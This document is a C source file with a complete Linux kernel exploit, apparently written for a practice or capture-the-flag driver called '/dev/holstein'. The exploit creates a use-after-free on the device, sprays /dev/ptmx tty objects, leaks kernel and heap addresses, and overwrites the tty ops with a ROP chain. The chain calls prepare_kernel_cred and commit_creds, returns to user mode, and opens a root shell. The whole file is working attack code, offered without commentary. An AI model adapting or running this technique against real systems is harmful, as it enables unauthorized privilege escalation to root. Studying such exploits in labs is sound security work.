#include <stdio.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
int spray[100];

//0xffffffff8114fbe8: add al, ch; push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; 
//0xffffffff8114078a: pop rdi; ret;
//0xffffffff81638e9b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 
//0xffffffff810eb7e4: pop rcx; ret;
//0xffffffff81072560 T prepare_kernel_cred
//0xffffffff810723c0 T commit_creds
//0xffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode

#define push_rdx_pop_rsp_offset 0x14fbe8
#define pop_rdi_ret_offset 0x14078a
#define pop_rcx_ret_offset 0xeb7e4
#define prepare_kernel_cred_offset 0x72560
#define commit_creds_offset 0x723c0
#define swapgs_restore_regs_and_return_to_usermode_offset 0x800e10
#define mov_rdi_rax_offset  0x638e9b

unsigned long user_cs, user_sp, user_ss, user_rflags;



void backdoor()
{
	printf("****getshell****");
	system("id");
	system("/bin/sh");
}

void save_user_land()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n", user_rflags);
	printf("[#] backdoor: 0x%lx \n\n", backdoor);
}


int main() {
	save_user_land();
	int fd1 = open("/dev/holstein", O_RDWR);
	int fd2 = open("/dev/holstein", O_RDWR);
	close(fd1);
	for (int i = 0; i < 50; i++)
	{
		spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (spray[i] == -1)
		{
			printf("error!\n");
			exit(-1);
		}
	}
	char buf[0x400];
	read(fd2, buf, 0x400);
	unsigned long *p = (unsigned long *)&buf;
	//for (unsigned int i = 0; i < 0x80; i++)
	//	printf("[%x]:addr:0x%lx\n",i,p[i]);
	unsigned long kernel_addr = p[3];
	unsigned long heap_addr = p[7];
	printf("kernel_addr:0x%lx\nheap_addr:0x%lx\n",kernel_addr,heap_addr);
	unsigned long kernel_base = kernel_addr - 0xc39c60;
	unsigned long g_buf = heap_addr - 0x38;
	printf("kernel_base:0x%lx\ng_buf:0x%lx\n",kernel_base,g_buf);
	*(unsigned long *)&buf[0x18] = g_buf;
	p[0xc] = push_rdx_pop_rsp_offset + kernel_base;
	//for (unsigned long i = 0xd; i < 0x80; i++)
	//	p[i] = i;
	p[0x21] = pop_rdi_ret_offset + kernel_base;
	p[0x22] = 0;
	p[0x23] = prepare_kernel_cred_offset + kernel_base;
	p[0x24] = pop_rcx_ret_offset + kernel_base;
	p[0x25] = 0;
	p[0x26] = mov_rdi_rax_offset + kernel_base;
	p[0x27] = commit_creds_offset + kernel_base;
	p[0x28] = swapgs_restore_regs_and_return_to_usermode_offset + 0x16 + kernel_base;
	p[0x29] = 0;
	p[0x2a] = 0;
	p[0x2b] = (unsigned long)backdoor;
    	p[0x2c] = user_cs;
    	p[0x2d] = user_rflags;
    	p[0x2e] = user_sp;
    	p[0x2f] = user_ss;  
	write(fd2, buf, 0x400);
	for (int i = 0; i < 50; i++)
		ioctl(spray[i], 0, g_buf+0x100);	
		
}
